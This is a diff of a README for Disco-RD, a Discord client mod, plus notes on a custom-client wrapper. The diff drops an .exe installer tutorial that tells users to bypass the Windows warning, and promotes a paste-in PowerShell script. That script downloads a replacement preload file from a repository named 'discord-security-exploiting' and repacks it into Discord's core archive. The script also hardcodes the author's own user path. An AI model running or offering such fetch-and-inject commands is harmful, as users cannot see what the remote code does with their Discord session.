@@ -66,67 +66,11 @@ Multi-platform Discord modification
 
 ###### Disco-RD is currently still in development. Bugs are to be expected.
 
-  
-
-### Windows Tutorial
-
-###### If you have any issues - then try the PowerShell version below
-
-##### Prerequisites 
-  * A Windows PC
-  * Discord installed
-  * [NodeJS](https://nodejs.org/en/)
-  * Internet access (duh)
-
-#### Step by step tutorial
-* Start by downloading NodeJS and installing it if you dont have it - you can check if you have it by pressing the windows key and searching for `node` - it should look like this if you have it installed
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/nodejs_check.png)
-
-* Now download the installer : [Disco-RD Windows](https://raw.githubusercontent.com/FiskDk/Disco-RD-Windows-Installer/blob/master/Disco-RD%20Injector.exe)
-* Now make sure Discord is installed - and running
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/discord_running.png)
-
-* Now open "Disco-RD Injector.exe"
-* A window like this should pop up
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/protect.png)
-
-* Click "More info"
-*  It should now look like this
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/more_info.png)
-
-* Now click "Run anyway"
-* The installer should now open - and you'll see this window
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/rd_gui_first.png)
-
-* Now click the "Install Disco-RD" button
-* It will start installing, you'll see some console windows pop up
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/installing.png)
-
-* just let it run until Discord relaunches then click the "Finish" button
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/guiDone.png)
-
-* If it shows up like this 
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/if-only-black.png)
-
-* Then click `CTRL + R` to reload Discord
-* It should now look like this
-
-![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/done.png)
-
-### PowerShell tutorial
-###### only use this if the installer dosn't work
+### Windows tutorial
 
 * Open a PowerShell CLI by pressing the Windows key + R on your keyboard - then type "powershell" and press enter
 
-* copy the code located on the bottom of this page (scroll all the way down) then paste it in the PowerShell window
+* Copy the code below and paste it in the PowerShell window (Windows 10 users can just right click the terminal window after the code is copied.)
 
 * When it says its done, you can go and close the window and launch Discord
 
@@ -136,8 +80,25 @@ If it instantly closes when you run the code, then check if you have NodeJS inst
 
 [Install NodeJS without admin permissions](http://abdelraoof.com/blog/2014/11/11/install-nodejs-without-admin-rights/)
   
-
-### iOS and iPadOS Tutorial
+```powershell
+$nodeV = (node -v) | Out-String
+if ($nodeV.StartsWith("v")) { echo NodeJS Version : $nodeV } else {exit}
+Stop-process -Name discord
+cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
+if (Test-Path "core.old") { remove-item "core.old" }
+if (Test-Path "rd") { remove-item "rd" }
+npx asar extract core.asar rd
+cd rd\app
+remove-item "mainScreenPreload.js"
+Invoke-WebRequest https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/windows_preload.js -OutFile mainScreenPreload.js
+cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
+if (test-path "core.asar") { rename-item "core.asar" "core.old" }
+npx asar pack rd core.asar
+Remove-Item -Recurse -Force "rd"
+echo "You can now launch Discord - Thanks for installing Disco-RD <3 - if you need help - contact me f1sk#3621 on Discord"
+<3 - you can close this now
+```
+### iPadOS Tutorial
 
   
 
@@ -253,27 +214,6 @@ Now click the "Load unpacked" button and navigate to the folder "Disco-RD Web" -
 
 Now when you go to Discord in your browser you should see Disco-RD
 
-
-### PowerShell code 
-
-```powershell
-$nodeV = (node -v) | Out-String
-if ($nodeV.StartsWith("v")) { echo NodeJS Version : $nodeV } else {exit}
-Stop-process -Name discord
-cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
-if (Test-Path "core.old") { remove-item "core.old" }
-if (Test-Path "rd") { remove-item "rd" }
-npx asar extract core.asar rd
-cd rd\app
-remove-item "mainScreenPreload.js"
-Invoke-WebRequest https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/windows_preload.js -OutFile mainScreenPreload.js
-cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
-if (test-path "core.asar") { rename-item "core.asar" "core.old" }
-npx asar pack rd core.asar
-Remove-Item -Recurse -Force "rd"
-echo "You can now launch Discord - Thanks for installing Disco-RD <3 - if you need help - contact me f1sk#3621 on Discord"
-<3 - you can close this now
-```
 </details>
 
 # RDWrapper
@@ -282,6 +222,7 @@ echo "You can now launch Discord - Thanks for installing Disco-RD <3 - if you ne
 
  Make your own custom Discord client!
  <details>
+
 ## How to use : 
 Download the RDWrapper folder, then look in the "How To.txt" file - or read it here
 
@@ -293,8 +234,11 @@ Make a GitHub repo
 in your repo you'll need to create 2 files, a JS file, and a CSS file
 Write your custom client code in the JS file, and your custom theme/css in the CSS file
 Now get your direct links
+
 https://raw.githubusercontent.com/GitHubUserName/RepoName/master/filename
+
 Example :
+
 https://raw.githubusercontent.com/FiskDk/RDWrapper/master/ExampleScript/main.css
 
 Now open RDWrapper.cmd and follow the instructions
